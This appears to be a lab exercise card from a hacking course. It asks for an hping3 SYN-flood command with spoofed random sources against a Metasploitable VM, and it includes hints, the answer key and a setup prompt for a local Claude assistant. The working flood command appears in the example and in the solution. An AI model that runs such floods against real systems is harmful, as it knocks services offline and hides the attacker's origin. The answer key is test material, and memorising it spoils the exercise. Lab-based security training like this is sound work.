# Q146 — hping3 SYN Flood

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` / external |
| **Domain** | 09 — DoS / 08 — Social Eng / 10 — Session Hijacking / Recon |
| **Difficulty** | 🟢 Easy |
| **Tools** | `hping3` |
| **Time budget** | 10–20 min |

---

## 📝 Question

Use hping3 to SYN-flood Metasploitable port 80 from Parrot. Provide command (with random source).

---

## 🎯 Flag Format

```
cmd=<short>
```

Example: `cmd=sudo hping3 -S --flood --rand-source -p 80 192.168.52.129`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

`--flood` no replies; `--rand-source` random src IPs.
</details>

<details>
<summary>Hint 2</summary>

Stop with Ctrl+C — lab only!
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
sudo hping3 -S --flood --rand-source -p 80 192.168.52.129
```

Floods port 80 with SYNs.

**Answer:** `cmd=sudo hping3 -S --flood --rand-source -p 80 192.168.52.129`

📖 Ref: [playbooks/dos-playbook.md](../../playbooks/dos-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q146:
1. Verify Metasploitable2 up; apache2 running.
2. On Parrot: which hping3 (sudo apt install hping3).
3. Run as sudo since raw sockets needed.
4. WARNING: lab only — SYN flood will DoS apache2; restart after with sudo service apache2 restart on target.

Report back: "Lab ready for Q146 — hping3 installed, apache2 up on 192.168.52.129".
```
